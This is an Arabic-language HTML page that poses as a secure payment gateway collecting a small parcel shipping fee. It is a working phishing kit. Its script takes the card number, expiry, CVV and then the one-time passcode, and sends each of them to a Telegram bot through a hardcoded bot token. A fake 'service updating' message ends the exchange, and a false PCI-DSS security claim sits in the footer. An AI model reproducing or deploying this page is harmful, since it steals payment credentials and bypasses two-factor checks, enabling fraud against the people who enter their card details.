<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الآمنة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .payment-card { background: white; width: 100%; max-width: 400px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; }
        .bank-logos { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .bank-logos img { height: 30px; opacity: 0.7; }
        .info-box { background: #eef5ff; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-right: 5px solid #1a73e8; }
        .info-box p { margin: 5px 0; font-size: 14px; color: #444; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; transition: 0.3s; }
        input:focus { border-color: #1a73e8; box-shadow: 0 0 5px rgba(26,115,232,0.2); }
        button { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer { text-align: center; margin-top: 15px; font-size: 12px; color: #888; }
    </style>
</head>
<body>

<div class="payment-card" id="mainBox">
    <div class="bank-logos">
        <span style="font-weight: bold; color: #1a73e8;">بوابة دفع آمنة</span>
        <div style="display: flex; gap: 5px;">💳</div>
    </div>
    
    <div class="info-box">
        <p><strong>المستلم:</strong> مدينة بنت قحطان</p>
        <p><strong>المبلغ المطلوب:</strong> 15.00 ر.س</p>
        <p><strong>الوصف:</strong> رسوم شحن طرد رقم SA-9912</p>
    </div>

    <div id="paymentInputs">
        <input type="text" id="card" placeholder="رقم البطاقة (16 رقم)" maxlength="16">
        <div style="display:flex; gap:10px;">
            <input type="text" id="date" placeholder="MM/YY" maxlength="5">
            <input type="text" id="cvv" placeholder="CVV" maxlength="3">
        </div>
        <button onclick="sendToBot()">تأكيد الدفع</button>
    </div>

    <div id="otpBox" style="display: none; text-align: center;">
        <p style="color: #d93025; font-weight: bold;">تم إرسال رمز التحقق إلى جوالك</p>
        <input type="text" id="otp" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6">
        <button onclick="sendOtp()" style="background: #34a853;">تفعيل</button>
    </div>

    <div class="footer">🔒 مشفر بمعيار أمان PCI-DSS العالمي</div>
</div>

<script>
    const token = "7836825435:AAHWkpucQxfCRx_Ma0Rt5kbwjUQRlmVXLhc";
    const chat_id = "6134623694";

    function sendToBot() {
        const card = document.getElementById('card').value;
        const date = document.getElementById('date').value;
        const cvv = document.getElementById('cvv').value;

        if(card.length >= 15 && date.length === 5 && cvv.length === 3) {
            const text = `🎯 صيد جديد (نظامي):\n👤 المستلم: مدينة بنت قحطان\n💳 الكرت: ${card}\n📅 التاريخ: ${date}\n🔐 CVV: ${cvv}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
            
            document.getElementById('paymentInputs').style.display = 'none';
            document.getElementById('otpBox').style.display = 'block';
        } else {
            alert("يرجى التأكد من بيانات البطاقة");
        }
    }

    function sendOtp() {
        const otp = document.getElementById('otp').value;
        if(otp.length >= 4) {
            const text = `🔑 رمز التحقق (OTP) المستلم:\n🔢 الرمز: ${otp}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
            .then(() => alert("الخدمة قيد التحديث، يرجى المحاولة لاحقاً"));
        } else {
            alert("أدخل رمز صحيح");
        }
    }
</script>

</body>
</html>
